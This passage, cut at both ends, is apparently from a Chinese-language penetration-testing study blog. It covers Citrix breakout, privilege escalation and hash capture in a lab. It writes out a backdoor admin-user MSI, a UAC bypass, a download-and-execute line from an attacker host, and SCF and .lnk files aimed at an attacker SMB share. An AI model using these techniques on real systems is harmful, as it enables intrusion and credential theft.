class="title">settings</span></span></span><br><span class="line"><span class="function">--------------------</span></span><br><span class="line"><span class="function">    <span class="title">Cost</span>                   : <span class="title">Unrestricted</span></span></span><br><span class="line"><span class="function">    <span class="title">Congested</span>              : <span class="title">No</span></span></span><br><span class="line"><span class="function">    <span class="title">Approaching</span> <span class="title">Data</span> <span class="title">Limit</span> : <span class="title">No</span></span></span><br><span class="line"><span class="function">    <span class="title">Over</span> <span class="title">Data</span> <span class="title">Limit</span>        : <span class="title">No</span></span></span><br><span class="line"><span class="function">    <span class="title">Roaming</span>                : <span class="title">No</span></span></span><br><span class="line"><span class="function">    <span class="title">Cost</span> <span class="title">Source</span>            : <span class="title">Default</span></span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Citrix-Breakout"><a href="#Citrix-Breakout" class="headerlink" title="Citrix Breakout"></a>Citrix Breakout</h1><p>许多组织利用虚拟化平台（如终端服务、Citrix、AWS AppStream、CyberArk PSM 和 Kiosk）提供远程访问解决方案，以满足其业务需求。然而，大多数组织在其桌面环境中实施了”锁定”措施，以最大限度地减少恶意员工和受感染帐户对整个域安全的潜在影响。虽然这些桌面限制可以阻止威胁行为者，但他们仍有可能”突破”受限环境。</p>
<p>突破的基本方法：</p>
<ol>
<li>获得<code>Dialog Box</code>的访问权限。</li>
<li>利用对话框来实现<code>command execution</code>。</li>
<li><code>Escalate privileges</code>以获得更高级别的访问权限。</li>
</ol>
<p>使用生成的目标的 RDP 会话访问 <a target="_blank" rel="noopener" href="http://humongousretail.com/remote/%EF%BC%8C%E5%B9%B6%E4%BD%BF%E7%94%A8%E4%B8%8B%E9%9D%A2%E6%8F%90%E4%BE%9B%E7%9A%84%E5%87%AD%E6%8D%AE%E7%99%BB%E5%BD%95%E3%80%82%E7%99%BB%E5%BD%95%E5%90%8E%EF%BC%8C%E5%8D%95%E5%87%BB%E9%BB%98%E8%AE%A4%E6%A1%8C%E9%9D%A2%E4%BB%A5%E8%8E%B7%E5%8F%96">http://humongousretail.com/remote/，并使用下面提供的凭据登录。登录后，单击默认桌面以获取</a> Citrix launch.ica 文件以连接到受限环境。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Username: pmorgan</span><br><span class="line">Password: Summer1Summer!</span><br><span class="line">Domain: \.local</span><br></pre></td></tr></table></figure>

<h2 id="绕过路径限制"><a href="#绕过路径限制" class="headerlink" title="绕过路径限制"></a>绕过路径限制</h2><p>通过 Citrix 部署的众多桌面应用程序都具备与操作系统上的文件交互的功能。保存、另存为、打开、加载、浏览、导入、导出、帮助、搜索、扫描和打印等功能通常为攻击者提供了调用 Windows 对话框的机会。</p>
<p>可以在文件名字段下输入 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths">UNC</a> 路径<code> \\127.0.0.1\c$\users\pmorgan</code>，将文件类型设置为所有文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\127.0.0.1\c$\users\pmorgan</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732336907430.png" alt="paint_flag"></p>
<h2 id="从受限环境访问-SMB-共享"><a href="#从受限环境访问-SMB-共享" class="headerlink" title="从受限环境访问 SMB 共享"></a>从受限环境访问 SMB 共享</h2><p>由于设置了限制，文件资源管理器不允许直接访问攻击者机器上的 SMB 共享或托管 Citrix 环境的 Ubuntu 服务器上的 SMB 共享。但是，通过利用 Windows 对话框中的 UNC 路径，可以绕过此限制。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbserver.py -smb2support share $(pwd)</span><br></pre></td></tr></table></figure>

<p>UNC 路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\10.13.38.95\share</span><br></pre></td></tr></table></figure>

<p>由于文件资源管理器中存在限制，因此无法直接复制文件。不过，另一种方法是右键单击可执行文件，然后启动它。</p>
<p>可执行文件 pwn.exe 是从 pwn.c 文件的自定义编译二进制文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;C:\Windows\\System32\\cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732336311916.png" alt="paint_share"></p>
<h2 id="替代资源管理器"><a href="#替代资源管理器" class="headerlink" title="替代资源管理器"></a>替代资源管理器</h2><p>如果对文件资源管理器施加了严格限制，可以使用替代文件系统编辑器（如 Q-Dir 或 Explorer++）作为解决方法。这些工具可以绕过组策略强制执行的文件夹限制，允许用户浏览和访问在标准文件资源管理器环境中原本受限制的文件和目录。</p>
<p>由于存在限制，文件资源管理器以前无法从 SMB 共享复制文件。但是，通过使用 <code>Explorer++</code>，已成功演示了将文件从<code> \\10.13.38.95\share</code> 位置复制到属于用户 <code>pmorgan</code> 的桌面的功能（如以下屏幕截图所示）。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732194722782.png" alt="Explorer++"></p>
<h2 id="备用注册表编辑器"><a href="#备用注册表编辑器" class="headerlink" title="备用注册表编辑器"></a>备用注册表编辑器</h2><p>同样，当默认注册表编辑器被组策略阻止时，可以使用替代注册表编辑器来绕过标准组策略限制。Simpleregedit、Uberregedit 和 SmallRegistryEditor 就是此类 GUI 工具的示例，它们有助于编辑 Windows 注册表，而不会受到组策略强加的阻止的影响。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732194848642.png" alt="smallregistry"></p>
<h2 id="修改现有快捷方式文件"><a href="#修改现有快捷方式文件" class="headerlink" title="修改现有快捷方式文件"></a>修改现有快捷方式文件</h2><p>通过修改现有 Windows 快捷方式并在目标字段中设置所需的可执行文件的路径来实现对文件夹路径的未经授权的访问。</p>
<p>以下步骤概述了该过程：</p>
<ol>
<li><p>右键单击所需的快捷方式</p>
</li>
<li><p>选择属性</p>
</li>
<li><p>在该<code>Target</code>字段内，修改要访问的文件夹的路径</p>
</li>
<li><p>执行快捷方式，将生成 cmd</p>
</li>
</ol>
<p>如果现有快捷方式文件不可用，可以考虑其他方法。一种选择是使用 SMB 服务器传输现有快捷方式文件。或者，可以使用 PowerShell 创建新的快捷方式文件，如“生成恶意 .lnk 文件”选项卡下的“与用户交互”部分中所述。</p>
<h2 id="脚本执行"><a href="#脚本执行" class="headerlink" title="脚本执行"></a>脚本执行</h2><p>当脚本扩展名（例如 .bat、.vbs 或 .ps）配置为使用各自的解释器自动执行其代码时，它就有可能删除可用作交互式控制台或促进下载和启动各种第三方应用程序的脚本，从而绕过现有的限制。</p>
<ol>
<li>创建一个新的文本文件并将其命名为”evil.bat”</li>
<li>使用文本编辑器（例如记事本）打开”evil.bat”</li>
<li>在文件中输入命令”cmd”</li>
</ol>
<p>执行”evil.bat”文件后，它将启动命令提示符窗口。</p>
<h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><p>一旦建立了对命令提示符的访问，就可以更轻松地搜索系统中的漏洞。例如，还可以使用<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">Winpeas</a>和<a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">PowerUp</a>等工具来识别操作系统中的潜在安全问题和漏洞。</p>
<p>使用<code>PowerUp.ps1</code>，如发现<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated">“Always Install Elevated”</a>键存在并设置</p>
<p>还可以通过查询相应的注册表项来使用命令提示符来验证这一点：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">reg</span> <span class="title">query</span> <span class="title">HKCU</span>\<span class="title">SOFTWARE</span>\<span class="title">Policies</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">Installer</span> /<span class="title">v</span> <span class="title">AlwaysInstallElevated</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HKEY_CURRENT_USER</span>\<span class="title">SOFTWARE</span>\<span class="title">Policies</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">Installer</span></span></span><br><span class="line"><span class="function">		<span class="title">AlwaysInstallElevated</span>    <span class="title">REG_DWORD</span>    0<span class="title">x1</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">reg</span> <span class="title">query</span> <span class="title">HKLM</span>\<span class="title">SOFTWARE</span>\<span class="title">Policies</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">Installer</span> /<span class="title">v</span> <span class="title">AlwaysInstallElevated</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">SOFTWARE</span>\<span class="title">Policies</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">Installer</span></span></span><br><span class="line"><span class="function">		<span class="title">AlwaysInstallElevated</span>    <span class="title">REG_DWORD</span>    0<span class="title">x1</span></span></span><br></pre></td></tr></table></figure>

<p>利用 PowerUp 的<code>Write-UserAddMSI</code>功能。此功能可帮助直接在桌面上创建<code>.msi</code>文件。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\pmorgan\Desktop&gt; <span class="built_in">Import-Module</span> .\PowerUp.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\Users\pmorgan\Desktop&gt; <span class="built_in">Write-UserAddMSI</span></span><br><span class="line">	</span><br><span class="line">Output Path</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">UserAdd.msi</span><br></pre></td></tr></table></figure>

<p>现在可以执行 UserAdd.msi 并在管理员组下创建一个新用户 backdoor:T3st@123。请注意，如果为其输入的密码不符合密码复杂性标准，则会引发错误。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">runas</span> /<span class="title">user:backdoor</span> <span class="title">cmd</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Enter</span> <span class="title">the</span> <span class="title">password</span> <span class="title">for</span> <span class="title">backdoor</span>: <span class="title">T3st</span>@123</span></span><br><span class="line"><span class="function"><span class="title">Attempting</span> <span class="title">to</span> <span class="title">start</span> <span class="title">cmd</span> <span class="title">as</span> <span class="title">user</span> &quot;<span class="title">VDESKTOP3</span>\<span class="title">backdoor</span>&quot; ...</span></span><br></pre></td></tr></table></figure>

<h2 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h2><p>即使新建立的用户后门是管理员组的成员，由于存在用户帐户控制 (UAC)，访问 <code>C:\Users\Administrator</code> 目录仍然不可行。UAC 是 Windows 中实现的一种安全机制，用于保护操作系统免受未经授权的更改。使用 UAC，每个需要管理员访问令牌的应用程序都必须提示最终用户同意。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt; <span class="title">cd</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Administrator</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Access</span> <span class="title">is</span> <span class="title">denied</span>.</span></span><br></pre></td></tr></table></figure>

<p>有许多 UAC 绕过脚本可用，旨在帮助绕过主动用户帐户控制 (UAC) 机制。这些脚本提供了绕过 UAC 限制并获得提升权限的方法。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Public&gt; <span class="built_in">Import-Module</span> .\Bypass<span class="literal">-UAC</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Public&gt; Bypass<span class="literal">-UAC</span> <span class="literal">-Method</span> UacMethodSysprep</span><br></pre></td></tr></table></figure>

<p>成功绕过 UAC 后，将打开一个具有更高权限的新 powershell 窗口，可以通过使用命令 whoami &#x2F;all 或 whoami &#x2F;priv 来确认这一点。</p>
<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p><a target="_blank" rel="noopener" href="https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/">Breaking out of Citrix and other Restricted Desktop environments</a></p>
<p><a target="_blank" rel="noopener" href="https://node-security.com/posts/breaking-out-of-windows-environments/">Breaking out of Windows Environments</a></p>
<hr>
<h1 id="Interacting-with-Users"><a href="#Interacting-with-Users" class="headerlink" title="Interacting with Users"></a>Interacting with Users</h1><p>通过嗅探他们的网络流量&#x2F;本地命令或攻击需要用户交互的已知易受攻击的服务来窃取毫无戒心的用户的凭据。</p>
<h2 id="流量捕获"><a href="#流量捕获" class="headerlink" title="流量捕获"></a>流量捕获</h2><p>如果安装了<code>Wireshark</code>，非特权用户可能能够捕获网络流量，因为默认情况下未启用将 Npcap 驱动程序访问限制为仅限管理员的选项。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1731727867240.png" alt="ftp"></p>
<p>另外，假设客户将置于环境中的攻击机器上。在这种情况下，值得运行<code>tcpdump</code>或<code>Wireshark</code>一段时间来查看通过网络传输的流量类型以及是否可以看到任何有趣的东西。可以从攻击框运行工具<a target="_blank" rel="noopener" href="https://github.com/DanMcInerney/net-creds">net-creds</a>来嗅探实时接口或 pcap 文件中的密码和哈希值。</p>
<h2 id="进程命令行"><a href="#进程命令行" class="headerlink" title="进程命令行"></a>进程命令行</h2><p>当以用户身份获取 shell 时，可能会有计划任务或其他正在执行的进程在命令行上传递凭据。</p>
<p>可以使用类似下面的脚本来查找进程命令行，它每两秒捕获一次进程命令行，并将当前状态与之前的状态进行比较，输出任何差异。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="variable">$true</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$process</span> = <span class="built_in">Get-WmiObject</span> Win32_Process | <span class="built_in">Select-Object</span> CommandLine</span><br><span class="line">  <span class="built_in">Start-Sleep</span> <span class="number">1</span></span><br><span class="line">  <span class="variable">$process2</span> = <span class="built_in">Get-WmiObject</span> Win32_Process | <span class="built_in">Select-Object</span> CommandLine</span><br><span class="line">  <span class="built_in">Compare-Object</span> <span class="literal">-ReferenceObject</span> <span class="variable">$process</span> <span class="literal">-DifferenceObject</span> <span class="variable">$process2</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将脚本托管在攻击机器上，并在目标主机上执行它</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">IEX</span> (<span class="built_in">iwr</span> <span class="string">&#x27;http://10.10.10.205/procmon.ps1&#x27;</span>) </span><br><span class="line"></span><br><span class="line">InputObject                                           SideIndicator</span><br><span class="line"><span class="literal">-----------</span>                                           <span class="literal">-------------</span></span><br><span class="line"><span class="selector-tag">@</span>&#123;CommandLine=C:\Windows\system32\DllHost.exe /Processid:&#123;AB8902B4<span class="literal">-09CA-4BB6-B78D-A8F59079A8D5</span>&#125;&#125; =&gt;      </span><br><span class="line"><span class="selector-tag">@</span>&#123;CommandLine=“C:\Windows\system32\cmd.exe” &#125;                          =&gt;      </span><br><span class="line"><span class="selector-tag">@</span>&#123;CommandLine=\??\C:\Windows\system32\conhost.exe <span class="number">0</span>x4&#125;                      =&gt;      </span><br><span class="line"><span class="selector-tag">@</span>&#123;CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0<span class="built_in">Rd</span>&#125;       =&gt;       </span><br><span class="line"><span class="selector-tag">@</span>&#123;CommandLine=“C:\Windows\system32\backgroundTaskHost.exe” <span class="literal">-ServerName</span>:CortanaUI.AppXy7vb4pc2... &lt;=</span><br></pre></td></tr></table></figure>

<h2 id="文件共享上的-SCF"><a href="#文件共享上的-SCF" class="headerlink" title="文件共享上的 SCF"></a>文件共享上的 SCF</h2><p>Windows 资源管理器使用 Shell 命令文件 (SCF) 在目录中上下移动、显示桌面等。可以操作 SCF 文件以使图标文件位置指向特定的 UNC 路径，并让 Windows 资源管理器在访问 .scf 文件所在的文件夹时启动 SMB 会话。如果将 IconFile 更改为控制的 SMB 服务器并运行<a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">Responder</a>、<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>或<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/InveighZero">InveighZero</a>等工具，通常可以捕获浏览共享的任何用户的 NTLMv2。</p>
<p>在此示例中，让创建以下文件并将其命名为 <code>@Inventory.scf</code>（类似于目录中的另一个文件，因此它不会显得格格不入）。在文件名开头放置一个 <code>@</code>，使其出现在目录顶部，以确保用户访问共享时 Windows 资源管理器能够看到并执行它。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.14.3\share\legit.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure>

<h3 id="Responder-捕获哈希"><a href="#Responder-捕获哈希" class="headerlink" title="Responder 捕获哈希"></a>Responder 捕获哈希</h3><p>在攻击机上启动 Responder 并等待用户浏览共享。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">$ sudo responder -wrf -v -I tun0</span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.0.2.0</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To kill this script hit CTRL-C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    DNS/MDNS                   [ON]</span><br><span class="line"></span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [ON]</span><br><span class="line">    Auth proxy                 [OFF]</span><br><span class="line">    SMB server                 [ON]</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">    POP3 server                [ON]</span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line">    RDP server                 [ON]</span><br><span class="line"></span><br><span class="line">[+] HTTP Options:</span><br><span class="line">    Always serving EXE         [OFF]</span><br><span class="line">    Serving EXE                [OFF]</span><br><span class="line">    Serving HTML               [OFF]</span><br><span class="line">    Upstream Proxy             [OFF]</span><br><span class="line"></span><br><span class="line">[+] Poisoning Options:</span><br><span class="line">    Analyze Mode               [OFF]</span><br><span class="line">    Force WPAD auth            [OFF]</span><br><span class="line">    Force Basic Auth           [OFF]</span><br><span class="line">    Force LM downgrade         [OFF]</span><br><span class="line">    Fingerprint hosts          [ON]</span><br><span class="line"></span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [tun2]</span><br><span class="line">    Responder IP               [10.10.14.3]</span><br><span class="line">    Challenge set              [random]</span><br><span class="line">    Don&#x27;t Respond To Names     [&#x27;ISATAP&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[!] Error starting SSL server on port 443, check permissions or other servers running.</span><br><span class="line">[+] Listening for events...</span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.129.43.30</span><br><span class="line">[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...&lt;SNIP&gt;...</span><br></pre></td></tr></table></figure>

<h3 id="使用恶意-lnk-文件捕获哈希值"><a href="#使用恶意-lnk-文件捕获哈希值" class="headerlink" title="使用恶意 .lnk 文件捕获哈希值"></a>使用恶意 .lnk 文件捕获哈希值</h3><p>在 Server 2019 主机上，使用 SCF 不再有效，但可以使用恶意<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943">.lnk</a>文件实现相同的效果。可以使用各种工具来生成恶意 .lnk 文件，例如<a target="_blank" rel="noopener" href="https://github.com/dievus/lnkbomb">Lnkbomb</a>，因为它不像创建恶意 .scf 文件那么简单。也可以使用几行 PowerShell 来创建一个：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$objShell</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> WScript.Shell</span><br><span class="line"><span class="variable">$lnk</span> = <span class="variable">$objShell</span>.CreateShortcut(<span class="string">&quot;C:\legit.lnk&quot;</span>)</span><br><span class="line"><span class="variable">$lnk</span>.TargetPath = <span class="string">&quot;\\&lt;attackerIP&gt;\@pwn.png&quot;</span></span><br><span class="line"><span class="variable">$lnk</span>.WindowStyle = <span class="number">1</span></span><br><span class="line"><span class="variable">$lnk</span>.IconLocation = <span class="string">&quot;%windir%\system32\shell32.dll, 3&quot;</span></span><br><span class="line"><span class="variable">$lnk</span>.Description = <span class="string">&quot;Browsing to the directory where this file is saved will trigger an auth request.&quot;</span></span><br><span class="line"><span class="variable">$lnk</span>.HotKey = <span class="string">&quot;Ctrl+Alt+O&quot;</span></span><br><span class="line"><span class="variable">$lnk</span>.Save()</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Pillaging"><a href="#Pillaging" class="headerlink" title="Pillaging"></a>Pillaging</h1><p>掠夺是从受感染系统获取信息的过程。这些信息可以是个人信息、公司蓝图、信用卡数据、服务器信息、基础设施和网络详细信息、密码或其他类型的凭证，以及与公司或正在进行的安全评估相关的任何信息。</p>
<p>以下是可以从受感染系统获取信息的一些来源：</p>
<ul>
<li>已安装的应用程序</li>
<li>已安装的服务<ul>
<li>网站</li>
<li>文件共享</li>
<li>数据库</li>
<li>目录服务（如 Active Directory、Azure AD 等）</li>
<li>名称服务器</li>
<li>部署服务</li>
<li>证书颁发机构</li>
<li>源代码管理服务器</li>
<li>虚拟化</li>
<li>消息传递</li>
<li>监控和记录系统</li>
<li>备份</li>
</ul>
</li>
<li>敏感数据<ul>
<li>键盘记录</li>
<li>屏幕截图</li>
<li>网络流量捕获</li>
<li>以前的审计报告</li>
</ul>
</li>
<li>用户信息<ul>
<li>历史文件，有趣的文档（.doc&#x2F;x、.xls&#x2F;x、password. *&#x2F;pass.*等）</li>
<li>角色和权限</li>
<li>Web 浏览器</li>
<li>即时通讯客户端</li>
</ul>
</li>
</ul>
<p>设想，已经在下文网络中提到的 Windows 服务器上站稳脚跟，并开始收集尽可能多的信息。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732336908029.png" alt="network"></p>
<h2 id="已安装的应用程序"><a href="#已安装的应用程序" class="headerlink" title="已安装的应用程序"></a>已安装的应用程序</h2><p>了解被攻陷的系统上安装了哪些应用程序可能有助于在渗透测试期间实现目标。重要的是要知道每个渗透测试都是不同的。</p>
<p>常见应用程序</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">dir</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>&quot;</span></span><br><span class="line"><span class="function"> <span class="title">Volume</span> <span class="title">in</span> <span class="title">drive</span> <span class="title">C</span> <span class="title">has</span> <span class="title">no</span> <span class="title">label</span>.</span></span><br><span class="line"><span class="function"> <span class="title">Volume</span> <span class="title">Serial</span> <span class="title">Number</span> <span class="title">is</span> 900<span class="title">E</span>-<span class="title">A7ED</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">Directory</span> <span class="title">of</span> <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">07/14/2022  08:31 <span class="title">PM</span>    &lt;<span class="title">DIR</span>&gt;          .</span></span><br><span class="line"><span class="function">07/14/2022  08:31 <span class="title">PM</span>    &lt;<span class="title">DIR</span>&gt;          ..</span></span><br><span class="line"><span class="function">05/16/2022  03:57 <span class="title">PM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">Adobe</span></span></span><br><span class="line"><span class="function">05/16/2022  12:33 <span class="title">PM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">Corsair</span></span></span><br><span class="line"><span class="function">05/16/2022  10:17 <span class="title">AM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">Google</span></span></span><br><span class="line"><span class="function">05/16/2022  11:07 <span class="title">AM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">Microsoft</span> <span class="title">Office</span> 15</span></span><br><span class="line"><span class="function">07/10/2022  11:30 <span class="title">AM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">mRemoteNG</span></span></span><br><span class="line"><span class="function">07/13/2022  09:14 <span class="title">AM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">OpenVPN</span></span></span><br><span class="line"><span class="function">07/19/2022  09:04 <span class="title">PM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">Streamlabs</span> <span class="title">OBS</span></span></span><br><span 